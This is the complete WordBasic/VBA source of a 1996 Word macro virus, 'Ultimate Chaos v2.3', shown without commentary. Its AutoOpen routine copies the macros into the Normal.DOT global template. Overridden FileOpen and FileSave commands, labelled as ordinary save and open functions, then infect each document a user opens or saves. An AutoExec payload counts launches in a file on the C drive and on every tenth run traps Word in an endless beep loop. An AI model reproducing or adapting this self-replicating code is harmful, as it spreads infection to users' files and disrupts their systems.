   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "TempFileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TempFileSave.MAIN"
   Dim dlg As Object

   WordBasic.DisableInput

   On Error GoTo -1: On Error GoTo Error_Handler

   '*********************************
   '* -x        UlTiMaTe         x- *
   '* CCCCC H   H AAAAA OOOOO SSSSS *
   '* C     H   H A   A O   O S     *
   '* C     HHHHH AAAAA O   O SSSSS *
   '* C     H   H A   A O   O     S *
   '* CCCCC H   H A   A OOOOO SSSSS *
   '* -x  v2.3 - 1st June, 1996  x- *
   '*********************************

   If InStr(WordBasic.[FileName$](), "Document") = 0 Then

       WordBasic.FileSave

   Else

       Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
       WordBasic.CurValues.FileSaveAs dlg
       WordBasic.Dialog.FileSaveAs dlg
       WordBasic.FileSaveAs dlg

   End If

   WordBasic.FileSaveAs Format:=1

   WordBasic.MacroCopy "Normal.DOT:FileOpen", WordBasic.[FileName$]() + ":TempFileOpen"
   WordBasic.MacroCopy "Normal.DOT:FileSave", WordBasic.[FileName$]() + ":TempFileSave"
   WordBasic.MacroCopy "Normal.DOT:AutoExec", WordBasic.[FileName$]() + ":TempAutoExec"
   WordBasic.MacroCopy "Normal.DOT:TempAutoOpen", WordBasic.[FileName$]() + ":AutoOpen"

   WordBasic.FileSave

   GoTo Finished

   Error_Handler:
   Select Case Err.Number
       Case 102
       Case Else
           WordBasic.Beep
           WordBasic.PrintStatusBar "Unexpected error!  Error code -", Err.Number
   End Select

   Finished:

   End Sub

   Attribute VB_Name = "TempFileOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Opens an existing document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TempFileOpen.MAIN"

   WordBasic.DisableInput

   On Error GoTo -1: On Error GoTo Error_Handler

   '*********************************
   '* -x        UlTiMaTe         x- *
   '* CCCCC H   H AAAAA OOOOO SSSSS *
   '* C     H   H A   A O   O S     *
   '* C     HHHHH AAAAA O   O SSSSS *
   '* C     H   H A   A O   O     S *
   '* CCCCC H   H A   A OOOOO SSSSS *
   '* -x  v2.3 - 1st June, 1996  x- *
   '*********************************

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   WordBasic.FileOpen dlg

   WordBasic.FileSaveAs Format:=1

   WordBasic.MacroCopy "Normal.DOT:FileOpen", WordBasic.[FileName$]() + ":TempFileOpen"
   WordBasic.MacroCopy "Normal.DOT:FileSave", WordBasic.[FileName$]() + ":TempFileSave"
   WordBasic.MacroCopy "Normal.DOT:AutoExec", WordBasic.[FileName$]() + ":TempAutoExec"
   WordBasic.MacroCopy "Normal.DOT:TempAutoOpen", WordBasic.[FileName$]() + ":AutoOpen"

   WordBasic.FileSave

   GoTo Finished

   Error_Handler:
   Select Case Err.Number
       Case 24
       Case 102
       Case Else
           WordBasic.Beep
           WordBasic.PrintStatusBar "Unexpected error!  Error code -", Err.Number
   End Select

   Finished:

   End Sub

   Attribute VB_Name = "TempAutoExec"

   Public Sub MAIN()
   Dim timer_
   Dim count_
   Dim a

   On Error GoTo -1: On Error GoTo Error_Handler

   '*********************************
   '* -x        UlTiMaTe         x- *
   '* CCCCC H   H AAAAA OOOOO SSSSS *
   '* C     H   H A   A O   O S     *
   '* C     HHHHH AAAAA O   O SSSSS *
   '* C     H   H A   A O   O     S *
   '* CCCCC H   H A   A OOOOO SSSSS *
   '* -x  v2.3 - 1st June, 1996  x- *
   '*********************************

   timer_ = 10

   Open "c:\count.txt" For Input As 1
   Input #1, count_
   Close 1

   count_ = count_ + 1
   If count_ > 10 Then count_ = 1
   Open "c:\count.txt" For Output As 1
   Print #1, count_
   Close 1

   If count_ / timer_ = WordBasic.Int(count_ / timer_) Then

       WordBasic.PrintStatusBar count_, "/", timer_
       For a = 1 To 10000
       Next a

   Loop_:
           WordBasic.Beep
       GoTo Loop_

   Else

       WordBasic.PrintStatusBar count_, "/", timer_
       For a = 1 To 10000
       Next a

   End If

   GoTo Finished

   Error_Handler:
   Select Case Err.Number
       Case 53
           count_ = 1
           Open "c:\count.txt" For Output As 1
           Print #1, count_
           Close 1
           WordBasic.PrintStatusBar count_, "/", timer_
           For a = 1 To 10000
           Next a
       Case Else
           WordBasic.Beep
           WordBasic.PrintStatusBar "Unexpected error!  Error code -", Err.Number
   End Select

   Finished:

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()

   WordBasic.DisableInput

   On Error GoTo -1: On Error GoTo Error_Handler

   '*********************************
   '* -x        UlTiMaTe         x- *
   '* CCCCC H   H AAAAA OOOOO SSSSS *
   '* C     H   H A   A O   O S     *
   '* C     HHHHH AAAAA O   O SSSSS *
   '* C     H   H A   A O   O     S *
   '* CCCCC H   H A   A OOOOO SSSSS *
   '* -x  v2.3 - 1st June, 1996  x- *
   '*********************************

   WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempFileOpen", "Normal.DOT:FileOpen"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempFileSave", "Normal.DOT:FileSave"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempAutoExec", "Normal.DOT:AutoExec"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Normal.DOT:TempAutoOpen"

   GoTo Finished

   Error_Handler:
   Select Case Err.Number
       Case 24
       Case Else
           WordBasic.Beep
           WordBasic.PrintStatusBar "Unexpected error!  Error code -", Err.Number
   End Select

   Finished:

   End Sub
